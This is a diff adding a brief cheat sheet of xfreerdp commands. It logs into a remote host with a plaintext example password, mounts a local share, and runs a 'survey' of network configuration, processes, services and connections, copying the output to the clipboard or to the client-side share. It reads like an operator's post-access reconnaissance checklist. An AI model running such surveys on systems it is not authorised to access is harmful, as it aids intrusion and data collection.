@@ -1,0 +1,19 @@
+xfreerdp
+----------
+
+#splash
+
+xfreerdp -sec-nla /u:JohnDoe /v:192.168.1.100:4489 /client-hostname:Windows
+
+# auth
+mkdir share
+
+xfreerdp /u:JohnDoe /p:Pwd123! /v:192.168.1.100:4489 /drive:X,./share /client-hostname:Windows
+
+# survey 
+ipconfig /all && tasklist /v && tasklist /svc netstat -anop tcp | clip
+
+
+ipconfig /all && tasklist /v && tasklist /svc netstat -anop tcp >> \\tsclient\X\survey.txt
+
+++++++++++  
